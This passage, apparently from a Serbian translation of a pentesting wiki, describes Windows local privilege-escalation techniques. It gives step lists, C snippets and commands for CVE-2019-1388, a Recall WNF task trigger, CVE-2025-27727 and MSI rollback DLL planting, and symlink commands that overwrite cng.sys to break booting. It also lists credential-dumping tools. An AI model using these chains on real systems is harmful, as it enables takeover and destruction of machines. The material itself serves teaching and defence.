3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Imate sve potrebne datoteke i informacije u sledećem GitHub repozitorijumu:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Od srednjeg do visokog nivoa integriteta u ulozi administratora / UAC bypass

Pročitajte ovo da biste **saznali više o nivoima integriteta**:


{{#ref}}
integrity-levels.md
{{#endref}}

Zatim **pročitajte ovo da biste saznali više o UAC-u i UAC bypass-ima:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Junction-i direktorijuma za otpremanje ka korenu koji opslužuje server

Aplikacija može da kreira predvidljiv poddirektorijum za otpremanje, upiše u njega naziv datoteke koji je dostavio pozivalac, a zatim obradi tu datoteku. Ako korisnik sa niskim privilegijama može da ukloni taj poddirektorijum i zameni ga NTFS junction-om pre upisa na strani servera, upis može da bude preusmeren preko junction-a u direktorijum koji opslužuje veb-server. Skripta postavljena tamo može da se izvrši pod identitetom veb-servisa ako server izvršava tu vrstu datoteke. Ovo je granica za proizvoljan upis specifična za aplikaciju; direktorijum za otpremanje sa dozvolom za upis ili postojeći junction sami po sebi to ne dokazuju.

Proverite tačno formiranje putanje i vreme izvršavanja u obrađivaču otpremanja, efektivne dozvole korisnika za brisanje i kreiranje poddirektorijuma, efektivne ACL-ove odredišta, da li proces koji upisuje prati reparse point-ove i da li veb-server izvršava datoteke u tom odredištu. Odvojeno utvrdite identitete procesa koji upisuje i veb-servera. Pasivna inventarizacija može da prikaže ACL-ove direktorijuma i metapodatke reparse point-a, ali ne može da utvrdi ponašanje obrađivača niti buduću zamenu junction-a. Ako se izvršavanje odvija pod nalogom servisa, pregledajte **stvarni token procesa** pre nego što razmotrite zaseban put eskalacije privilegija tokena.

## Čišćenje privilegovanog zakazanog zadatka pokrenuto preko WNF-a

Zakazani zadatak koji odbija ručno pokretanje i dalje može da izlaže okidač dostupan neprivilegovanom korisniku. Pri proveri privilegovanog zadatka, izvezite njegov XML i pregledajte **sve** okidače, kao i DACL zadatka, principal i akciju. Konkretno, `WnfStateChangeTrigger` navodi stanje Windows Notification Facility (WNF); ako trenutni korisnik ima dozvolu da objavi ažuriranje tog stanja, može posredno da pokrene zadatak pod njegovim podešenim identitetom, uprkos vrednosti `<AllowStartOnDemand>false</AllowStartOnDemand>`.<sup>[[43]](#references)</sup>

Na primer, zadatak Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` izvršavao se kao SYSTEM, prihvatao ažuriranja WNF stanja `7508BCA32C079E41` od standardnog korisnika, a zatim proveravao `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` čak i kada je Recall bio onemogućen.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Da biste testirali dostupnost, razrešite `ZwUpdateWnfStateData` iz `ntdll.dll`, pošaljite prazno ažuriranje za osmobajtni naziv stanja i uporedite status povratne vrednosti sa podacima o poslednjem pokretanju zadatka ili aktivnošću u Procmon-u. Sledeća skraćena proba koristi niz bajtova iz primera Recall zadatka; zamenite ga bajtovima izvezenim za zadatak koji testirate.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Pretvaranje rekurzivnog čišćenja u privilegovano brisanje

Korisna primitivna operacija nije samo okidač, već privilegovana rutina za čišćenje koja prihvata direktorijum pod kontrolom napadača. Pratite operaciju od enumeracije do konačne izmene: otkrivanje profila/sesija, deca odabrana pomoću džokera, `SHCreateItemFromParsingName` i `IFileOperation::DeleteItem` snažni su pokazatelji da će prethodno proverena putanja kasnije biti rekurzivno obrađena. Ako se potomci ne otvaraju relativno u odnosu na pouzdane ručke direktorijuma i ne validiraju pre brisanja, napadač može da promeni način razrešavanja putanje između enumeracije i upotrebe.<sup>[[43]](#references)</sup>

Uparite WNF okidač sa [oplock, junction i Object Manager symlink substitution](#from-folder-contents-delete-to-system-eop) opisanim ispod: oplock pauzira alat za čišćenje nakon što izabere legitimno dete, dok se upisivi predak zamenjuje tako da nastavljeno privilegovano brisanje razrešava putanju kroz `\RPC Control` do zaštićenog cilja. U Recall lancu, ovo je dovelo do SYSTEM brisanja `C:\Config.Msi`, potrebnog za dokumentovanu MSI rollback tehniku.<sup>[[31]](#references)[[43]](#references)</sup>

### Ugnježdeni potomci zaobilaze plitke ispravke za reparse point

Validacija samo korena pod kontrolom napadača i njegovog neposrednog deteta ne obezbeđuje rekurzivno brisanje zasnovano na putanji. Ostavite te proverene objekte legitimnim i premestite junction/oplock zamenu u dodatno dete ispod njih; `IFileOperation::DeleteItem` će na kraju doći do nevalidiranog potomka i pratiti njegov novi cilj. CVE-2026-20941 nastao je upravo zbog ove vrste nepotпуне ispravke: прва Recall закрпа је валидирала `UKP` и директоријум у облику GUID-а, али је задржала стару операцију рекурзивног брисања.<sup>[[43]](#references)</sup>

Безбедан образац је да отворите **сваког потомка** релативно у односу на већ поуздану ручку директоријума, прибавите и проверите коначну разрешену путању/објекат и примените ознаку за брисање на ту проверену ручку. Немојте валидирати префикс, па се затим вратити на рекурзивно брисање засновано на путањи. Приликом прегледа закрпе, проверите и структуре на стварном месту позива: у овом случају, runtime преглед `OBJECT_ATTRIBUTES` у `NtCreateFile` показао је непразан `RootDirectory` и релативно име `{GUID}\\secure_file.lock`, чиме је оповргнут погрешан излаз декомпајлера који је наговештавао другу примитивну операцију `FILE_DELETE_ON_CLOSE`.<sup>[[43]](#references)</sup>

## Од произвољног брисања/премештања/преименовања фасцикле до SYSTEM EoP

Техника описана [**у овом блог посту**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), са exploit кодом [**доступним овде**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Напад се у суштини састоји од злоупотребе Windows Installer-ове функције rollback како би се легитимне датотеке замениле злонамерним током процеса деинсталације. За ово нападач треба да направи **злонамерни MSI инсталатер** који ће се користити за отмицу фасцикле `C:\Config.Msi`. Windows Installer ће касније користити ту фасциклу за чување rollback датотека током деинсталације других MSI пакета, а те rollback датотеке ће бити измењене тако да садрже злонамерни payload.

### Инјекција путање за Windows Installer COM чишћење (CVE-2025-27727)

Клијент са ниским привилегијама може да приступи SYSTEM услузи `msiexec.exe` преко COM објекта `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Реверзним инжењерингом идентификовани су релевантни позиви `IMsiServer`: `MsiBeginTransactionW` на отступу vtable-а `0xA0`, `SetEEUIDirectoryAndFilter` на `0xC8` и `CleanupTempPackages` на `0x50`. Ови називи и отступи утврђени су реверзним инжењерингом и могу се разликовати између верзија.<sup>[[41]](#references)</sup>

За корисника који није администратор, `SetEEUIDirectoryAndFilter` имитира корисника само док отвара наведену путању са `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` и `FILE_FLAG_OPEN_REPARSE_POINT`. Тиме се доказује да корисник може да обрише директоријум и избегава праћење reparse point-а, али се **не** повезује проверени објекат датотеке са каснијим чишћењем, нити се доказује да га је креирао Windows Installer.<sup>[[41]](#references)</sup>

После `MsiBeginTransactionW`, `SetEEUIDirectoryAndFilter` заказује путању као фасциклу без обзира на аргумент филтера који је проследио корисник. Услуга уписује именовану вредност `REG_DWORD` у `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: име вредности је путања под контролом корисника, а податак `0x00000002` је ознака фасцикле. `CleanupTempPackages(NULL, FALSE)` затим директно покреће чишћење. Његов радник са повишеним привилегијама набраја вредности регистра и прослеђује уносе фасцикли функцији `FDeleteFolder` за рекурзивно брисање, без провере порекла путање. Ако уобичајено уклањање не успе, код такође позива `LockdownPath`, уклања атрибуте датотеке и покушава поново.<sup>[[41]](#references)</sup>

Минимални низ позива реконструисан из `msi.dll` је:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Korisni primitiv je ponovna upotreba putanje, a ne preusmeravanje junction-om. Registrujte napadačev `C:\Config.Msi`, uklonite ga i sačekajte da Windows Installer kasnije ponovo kreira istu putanju sa zaštićenim rollback podacima. Čišćenje veruje zastarelom imenu `TempPackages` i briše novi direktorijum kao SYSTEM. Time se zaobilazi predviđena zaštita koju pružaju `FILE_FLAG_OPEN_REPARSE_POINT` i mitigacija poverenja u preusmeravanje, jer nije potreban reparse point.<sup>[[41]](#references)</sup>

Ovaj primitiv za brisanje uklapa se u rollback lanac ispod: sačuvajte zaseban zapis `Installer\Folders`, obrišite zaštićeni `C:\Config.Msi`, ponovo ga kreirajte sa NULL DACL-om i zadržite handle sa dozvolom `WRITE_DAC` pre nego što installer pooštri DACL. Prethodno otvoreni handle može da vrati permisivni DACL pomoću `NtSetSecurityObject`, nakon čega se generisani `.rbs` može zameniti pre nego što se rollback nastavi.<sup>[[41]](#references)</sup>

Microsoft je ispravio ovu putanju tako što sprečava `CMsiTransaction::SetEEUIDirectoryAndFilter` da pozove `ScheduleFileOrFolderDelete` kada je omogućena nova feature gate opcija. COM poziv i dalje može da vrati uspeh, ali više ne dodaje putanju pod kontrolom napadača u `TempPackages`. Instalirajte Windows bezbednosne ispravke iz aprila 2025. umesto da uspešan povratni rezultat metode koristite kao proveru zakrpe.<sup>[[41]](#references)[[42]](#references)</sup>

Sažetak tehnike:

1. **Faza 1 – Priprema za otmicu (ostavite `C:\Config.Msi` praznim)**

- Korak 1: Instalirajte MSI
    - Napravite `.msi` koji instalira bezopasnu datoteku (npr. `dummy.txt`) u direktorijum u koji može da se upisuje (`TARGETDIR`).
    - Označite installer kao **„UAC Compliant“** kako bi mogao da ga pokrene **korisnik koji nije administrator**.
    - Ostavite otvoren **handle** ka datoteci nakon instalacije.

- Korak 2: Pokrenite deinstalaciju
    - Deinstalirajte isti `.msi`.
    - Proces deinstalacije počinje da premešta datoteke u `C:\Config.Msi` i da im menja imena u `.rbf` datoteke (rollback rezervne kopije).
    - **Anketirajte otvoreni file handle** pomoću `GetFinalPathNameByHandle` da biste otkrili kada datoteka postane `C:\Config.Msi\<random>.rbf`.

- Korak 3: Prilagođena sinhronizacija
    - `.msi` sadrži **prilagođenu uninstall akciju (`SyncOnRbfWritten`)** koja:
        - Signalizira kada se `.rbf` upiše.
        - Zatim **čeka** drugi događaj pre nego što nastavi deinstalaciju.

- Korak 4: Sprečite brisanje `.rbf` datoteke
    - Kada dobijete signal, **otvorite `.rbf` datoteku** bez `FILE_SHARE_DELETE` — time se **sprečava njeno brisanje**.
    - Zatim **pošaljite signal nazad** kako bi deinstalacija mogla da se završi.
    - Windows Installer ne uspeva da obriše `.rbf` datoteku, a pošto ne može da obriše sav sadržaj, **`C:\Config.Msi` se ne uklanja**.

- Korak 5: Ručno obrišite `.rbf` datoteku
    - Vi (napadač) ručno brišete `.rbf` datoteku.
    - Sada je **`C:\Config.Msi` prazan** i spreman za otmicu.

> U ovom trenutku **aktivirajte ranjivost proizvoljnog brisanja direktorijuma na nivou SYSTEM** da biste obrisali `C:\Config.Msi`.

2. **Faza 2 – Zamena rollback skripti zlonamernim skriptama**

- Korak 6: Ponovo kreirajte `C:\Config.Msi` sa slabim ACL-ovima
    - Sami ponovo kreirajte direktorijum `C:\Config.Msi`.
    - Postavite **slabe DACL-ove** (npr. Everyone:F) i **ostavite otvoren handle** sa dozvolom `WRITE_DAC`.

- Korak 7: Pokrenite drugu instalaciju
    - Ponovo instalirajte `.msi` sa sledećim podešavanjima:
        - `TARGETDIR`: lokacija u koju može da se upisuje.
        - `ERROROUT`: promenljiva koja izaziva prinudni neuspeh.
    - Ova instalacija će se koristiti za ponovno pokretanje **rollback-a**, koji čita `.rbs` i `.rbf`.

- Korak 8: Pratite pojavu `.rbs` datoteke
    - Koristite `ReadDirectoryChangesW` da pratite `C:\Config.Msi` dok se ne pojavi nova `.rbs` datoteka.
    - Zabeležite njeno ime.

- Korak 9: Sinhronizujte се pre rollback-а
    - `.msi` sadrži **prilagođenu install akciju (`SyncBeforeRollback`)** koja:
        - Signalizira događaj kada se kreira `.rbs` datoteka.
        - Zatim **čeka** pre nego što nastavi.

- Korak 10: Ponovo primenite slabe ACL-ove
    - Nakon prijema događaja `.rbs created`:
        - Windows Installer **ponovo primenjuje jake ACL-ove** na `C:\Config.Msi`.
        - Ali pošto i dalje imate handle sa dozvolom `WRITE_DAC`, možete ponovo da **primenite slabe ACL-ove**.

> ACL-ovi se **proveravaju samo prilikom otvaranja handle-a**, tako da i dalje možete da upisujete u direktorijum.

- Korak 11: Postavite lažne `.rbs` i `.rbf` datoteke
    - Zamenite `.rbs` datoteku **lažnom rollback skriptom** koja nalaže Windows-u da:
        - Vrati vašu `.rbf` datoteku (zlonamerni DLL) na **privilegovanu lokaciju** (npr. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Postavite lažnu `.rbf` datoteku koja sadrži **zlonamerni DLL payload na nivou SYSTEM**.

- Korak 12: Pokrenite rollback
    - Signalizirajte sinhronizacioni događaj kako bi se installer nastavio.
    - **Prilagođena akcija tipa 19 (`ErrorOut`)** podešena je tako da **namerno izazove neuspeh instalacije** u poznatom trenutku.
    - Time se pokreće **rollback**.

- Korak 13: SYSTEM instalira vaš DLL
    - Windows Installer:
        - Čita vaš zlonamerni `.rbs`.
        - Kopira vaš `.rbf` DLL na ciljnu lokaciju.
    - Sada imate **zlonamerni DLL na putanji sa koje ga učitava SYSTEM**.

- Završni korak: Izvršite SYSTEM kod
    - Pokrenite pouzdani **auto-elevated binarni fajl** (npr. `osk.exe`) koji učitava DLL čiju ste putanju oteli.
    - **Gotovo**: vaš kod se izvršava **kao SYSTEM**.


### Od proizvoljnog brisanja/premeštanja/preimenovanja datoteka do SYSTEM EoP

Glavna MSI rollback tehnika (prethodna) pretpostavlja da možete da obrišete **ceo direktorijum** (npr. `C:\Config.Msi`). Ali šta ako vaša ranjivost dozvoljava samo **proizvoljno brisanje datoteka**?

Mogli biste da iskoristite **interne mehanizme NTFS-a**: svaki direktorijum ima skriveni alternativni tok podataka koji se zove:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Ovaj stream čuva **metapodatke indeksa** fascikle.

Dakle, ako **obrišete stream `::$INDEX_ALLOCATION`** fascikle, NTFS **uklanja celu fasciklu** iz sistema datoteka.

To možete uraditi pomoću standardnih API-ja za brisanje datoteka, kao što je:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Iako pozivate API za brisanje *datoteke*, on **briše samu fasciklu**.

### Od brisanja sadržaja fascikle do SYSTEM EoP
Šta ako vam primitive ne dozvoljava da brišete proizvoljne datoteke/fascikle, ali vam **dozvoljava da brišete *sadržaj* fascikle koju kontroliše napadač**?

1. Korak 1: Napravite fasciklu i datoteku kao mamac
- Napravite: `C:\temp\folder1`
- U njoj napravite: `C:\temp\folder1\file1.txt`

2. Korak 2: Postavite **oplock** na `file1.txt`
- Oplock **pauzira izvršavanje** kada privilegovani proces pokuša da obriše `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Korak 3: Pokrenite SYSTEM proces (npr., `SilentCleanup`)
- Ovaj proces skenira fascikle (npr., `%TEMP%`) i pokušava da obriše njihov sadržaj.
- Kada naiđe na `file1.txt`, **oplock se aktivira** i prepušta kontrolu vašem callback-u.

4. Korak 4: Unutar oplock callback-a – preusmerite brisanje

- Opcija A: Premestite `file1.txt` na drugo mesto
    - Time se prazni `folder1` bez prekidanja oplock-a.
    - Nemojte direktno da obrišete `file1.txt` — to bi prerano oslobodilo oplock.

- Opcija B: Pretvorite `folder1` u **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Opcija C: Kreirajte **symlink** u `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Ovo cilja interni NTFS tok u kojem se čuvaju metapodaci fascikle — ako ga obrišete, briše se fascikla.

5. Korak 5: Oslobodite oplock
- SYSTEM proces nastavlja i pokušava da obriše `file1.txt`.
- Ali sada, zbog junction + symlink, zapravo briše:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Rezultat**: `C:\Config.Msi` je obrisao SYSTEM.

### Od kreiranja proizvoljne fascikle do trajnog DoS-a

Iskoristite primitiv koji vam omogućava da **kreirate proizvoljnu fasciklu kao SYSTEM/admin** — čak i ako **ne možete da upisujete datoteke** ili **postavljate slabe dozvole**.

Kreirajte **fasciklu** (ne datoteku) čiji je naziv **kritični Windows drajver**, npr.:
```
C:\Windows\System32\cng.sys
```

- Ova putanja obično odgovara kernel-mode drajveru `cng.sys`.
- Ako je **unapred kreirate kao fasciklu**, Windows neće uspeti da učita stvarni drajver pri pokretanju.
- Zatim Windows pokušava da učita `cng.sys` tokom pokretanja.
- Nailazi na fasciklu, **ne uspeva da pronađe stvarni drajver** i **ruši se ili zaustavlja pokretanje**.
- **Nema rezervne opcije** ni **oporavka** bez spoljne intervencije (npr. popravke pokretanja ili pristupa disku).

### Od privilegovanih putanja za logove/rezervne kopije + OM symlinks do proizvoljnog prepisivanja datoteka / DoS-a pri pokretanju

Kada **privilegovana usluga** upisuje logove/izvoze na putanju pročitanu iz **konfiguracije koju napadač može da menja**, preusmerite tu putanju pomoću **Object Manager symlinks + NTFS mount points** da biste privilegovani upis pretvorili u proizvoljno prepisivanje (čak i **bez** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Zahtevi**
- Konfiguracija koja čuva ciljnu putanju može da se menja od strane napadača (npr. `%ProgramData%\...\.ini`).
- Mogućnost kreiranja mount point-a ka `\RPC Control` i OM file symlink-a (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Privilegovana operacija koja upisuje na tu putanju (log, izvoz, izveštaj).

**Primer lanca**
1. Pročitajte konfiguraciju da biste saznali odredište privilegovanog loga, npr. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` u `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Preusmerite putanju bez administratorskih privilegija:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Sačekajte da privilegovana komponenta upiše log (npr. administrator pokrene „send test SMS“). Upis se sada vrši u `C:\Windows\System32\cng.sys`.
4. Pregledajte prepisano odredište (hex/PE parserom) da biste potvrdili oštećenje; ponovno pokretanje primorava Windows da učita izmenjenu putanju drajvera → **DoS u petlji pokretanja**. Ovo se može primeniti i na bilo koju zaštićenu datoteku koju će privilegovani servis otvoriti za upis.

> `cng.sys` se obično učitava iz `C:\Windows\System32\drivers\cng.sys`, ali ako kopija postoji u `C:\Windows\System32\cng.sys`, prvo može biti pokušan njen pristup, što je čini pouzdanim odredištem za DoS putem oštećenih podataka.



## **Od High Integrity do System**

### **Novi servis**

Ako već radite u procesu sa nivoom High Integrity, **put do SYSTEM** može biti jednostavan: samo **kreirajte i pokrenite novi servis**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Prilikom kreiranja servisnog binarnog fajla, proverite da li je validan servis ili da li binarni fajl brzo izvršava neophodne radnje, jer će biti ugašen za 20 sekundi ako nije validan servis.

### AlwaysInstallElevated

Iz procesa sa High Integrity možete pokušati da **omogućite AlwaysInstallElevated unose u registru** i da **instalirate** reverse shell pomoću _**.msi**_ wrapper-a.\
[Više informacija o uključenim ključevima registra i o instaliranju _.msi_ paketa potražite ovde.](#alwaysinstallelevated)

### High + SeImpersonate privilegija do System

**Kod možete** [**pronaći ovde**](seimpersonate-from-high-to-system.md)**.**

### Od SeDebug + SeImpersonate do Full Token privilegija

Ako imate te privilegije tokena (verovatno ćete ih pronaći u procesu koji već ima High Integrity), moći ćete da **otvorite skoro svaki proces** (osim zaštićenih procesa) pomoću SeDebug privilegije, **kopirate token** procesa i kreirate **proizvoljan proces sa tim tokenom**.\
Ovom tehnikom se obično **bira bilo koji proces koji radi kao SYSTEM sa svim privilegijama tokena** (_da, možete pronaći SYSTEM procese bez svih privilegija tokena_).\
**Primer koda koji izvršava predloženu tehniku možete** [**pronaći ovde**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Ovu tehniku koristi meterpreter za eskalaciju u `getsystem`. Sastoji se od **kreiranja pipe-a, a zatim kreiranja/zloupotrebe servisa za upisivanje u taj pipe**. Zatim će **server** koji je kreirao pipe pomoću privilegije **`SeImpersonate`** moći da **imitira token** klijenta pipe-a (servisa) i dobije SYSTEM privilegije.\
Ako želite da [**saznate više o name pipes, pročitajte ovo**](#named-pipe-client-impersonation).\
Ako želite da pročitate primer [**prelaska sa high integrity na System pomoću name pipes, pročitajte ovo**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ako uspete da **otmete DLL** koji **učitava** **proces** pokrenut kao **SYSTEM**, moći ćete da izvršite proizvoljan kod sa tim dozvolama. Zato je Dll Hijacking koristan i za ovu vrstu eskalacije privilegija; štaviše, **mnogo ga je lakše ostvariti iz procesa sa high integrity**, jer će imati **dozvole za upisivanje** u fascikle koje se koriste za učitavanje DLL-ova.\
**Možete** [**saznati više o Dll hijacking-u ovde**](dll-hijacking/index.html)**.**

### **Od Administrator ili Network Service do System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Od LOCAL SERVICE ili NETWORK SERVICE do punih privilegija

**Pročitajte:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Dodatna pomoć

[Statички impacket binarni fajlovi](https://github.com/ropnop/impacket_static_binaries)

## Korisni alati

**Najbolji alat za pronalaženje vektora za lokalnu eskalaciju privilegija u Windows-u:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Proverava pogrešne konfiguracije i osetljive fajlove (**[**proverite ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detektovano.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Proverava moguće pogrešne konfiguracije i prikuplja informacije (**[**proverite ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Proverava pogrešne konfiguracije**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Izvlači sačuvane informacije o sesijama za PuTTY, WinSCP, SuperPuTTY, FileZilla i RDP. Koristite -Thorough lokalno.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Izvlači akreditive iz Credential Manager-a. Detektovano.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Isprobava prikupljene lozinke širom domena**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh je PowerShell alat za ADIDNS/LLMNR/mDNS spoofing i man-in-the-middle napade.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Osnovna Windows enumeracija za privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Traži poznate privesc ranjivosti (ZASTARELO, zamenjuje ga Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalne provere **(potrebna su Admin prava)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Traži poznate privesc ranjivosti (potrebno ga je kompajlirati pomoću VisualStudio-a) ([**prekompajlirana verzija**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumerira host u potrazi za pogrešnim konfiguracijama (više alat za prikupljanje informacija nego za privesc) (potrebno ga je kompajlirati) **(**[**prekompajlirana verzija**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Izvlači akreditive iz brojnih programa (prekompajlirani exe dostupan na GitHub-u)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port PowerUp-a u C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Proverava pogrešnu konfiguraciju (prekompajlirani izvršni fajl dostupan na GitHub-u). Ne preporučuje se. Ne radi dobro u Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Proverava moguće pogrešne konfiguracije (exe iz Python-a). Ne preporučuje se. Ne radi dobro u Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Alat napravljen na osnovu ovog posta (za ispravan rad mu nije potreban accesschk, ali može da ga koristi).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Čita izlaz komande **systeminfo** i preporučuje funkcionalne exploit-e (lokalni Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Čita izlaz komande **systeminfo** i preporučuje funkcionalne exploit-e (lokalni Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projekat morate da kompajlirate koristeći odgovarajuću verziju .NET-a ([pogledajte ovo](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Da biste videli instaliranu verziju .NET-a na hostu žrtve, možete da uradite sledeće:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Osnove eskalacije privilegija u Windowsu](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Eskalacija privilegija iskorišćavanjem slabih dozvola fascikli](http://www.greyhathacker.net/?p=738)
- [3] [Eskalacija privilegija u Windowsu – podsetnik](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop – Radionica za lokalnu eskalaciju privilegija u Windowsu / Linuxu](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 – Napadi na Windows: AT je nova crna (Rob Fuller i Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Eskalacija privilegija – Windows – Potpuni OSCP vodič](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows – Eskalacija privilegija – PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Vodič za eskalaciju privilegija u Windowsu](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Kontrolni spisak za eskalaciju privilegija u Windowsu](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Eskalacija privilegija u Windowsu](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Metode eskalacije privilegija u Windowsu za pentestere](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: phishing putem Word VBA makroa preko SMTP-a → dešifrovanje hMailServer akreditiva → Veeam CVE-2023-27532 do SYSTEM-a](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: leak usled greške u format-stringu + stack BOF → VirtualAlloc ROP (RCE) i krađa kernel tokena](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Potraga za Silver Foxom: igra mačke i miša u senkama kernela](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
